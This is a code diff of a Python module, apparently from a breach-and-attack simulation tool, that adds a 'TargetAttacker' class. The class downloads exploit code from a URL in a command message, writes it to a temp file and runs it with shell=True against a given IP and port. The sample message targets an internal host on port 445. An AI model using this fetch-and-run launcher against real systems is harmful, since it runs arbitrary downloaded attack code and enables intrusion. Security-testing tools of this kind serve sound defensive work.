@@ -4,6 +4,19 @@ path = Path(__file__).parent.resolve()
 parent = path.parents[0]
 [sys.path.append(x) for x in map(str, [path, parent]) if x not in sys.path]
 
+import json
+import logging
+import logging.config
+import pathlib
+log_config = (pathlib.Path(__file__).parent.resolve().parents[0].joinpath("log_config.json"))
+config = json.load(open(str(log_config)))
+logging.config.dictConfig(config)
+logger = logging.getLogger(__name__)
+
+from processor import Processor
+import requests
+import subprocess
+
 """
 {
     "type": "attack_secu",
@@ -13,11 +26,58 @@ parent = path.parents[0]
     "usage": "python <FILE> <IP>",
 }
 """
-from processor import Processor
 class TargetAttacker(Processor):
-    fields = []
-    def __init__(self, cmd):
-        super().__init__(cmd)
+    fields = ["download", "target_ip", "target_port", "usage"]
+    signature = b"BAScope"
+
+    def __init__(self, cmd, id):
+        super().__init__(cmd, id)
         self.check_cmd(self.fields)
-    
-    pass
+        self.path = str(parent) + "/tmp/ex.py"
+        logger.debug(f"[target] file: {self.path}")
+        return
+
+    def run_cmd(self, debug):
+        self.debug = debug
+        target_ip = self.cmd["target_ip"]
+        self.link = self.cmd['download']  # 공격 코드 다운로드 링크
+        target_port = self.cmd['target_port']
+
+        if self.debug:
+            pass
+        else:
+            # 다운로드 받은 공격코드를 임시 디렉토리에 저장함
+            r = requests.get(self.link)
+            with open(self.path, "w") as f:
+                f.write(r.text)
+
+        replacements = [
+            ("<FILE>", self.path),
+            ("<IP>", target_ip),
+            ("<PORT>", str(target_port))
+        ]
+        usage = self.cmd_after_replacement(self.cmd['usage'], replacements)
+
+        subprocess.call(usage, shell=True)
+
+        return
+
+    def report(self):
+        url = self.base_url + self.report_url
+        data = {}
+
+        # attack target 모드에서는 무엇을 보고해야할까?
+        return
+
+if __name__ == '__main__':
+    msg = {
+        "type": "attack_secu",
+        "download": f"http://localhost:9000/exploit/1",
+        "target_ip": "172.30.1.26",
+        "target_port": 445,
+        "usage": "python <FILE> <IP>",
+    }
+
+    a = TargetAttacker(msg, 1)
+    a.run_cmd(debug = True)
+    a.report()
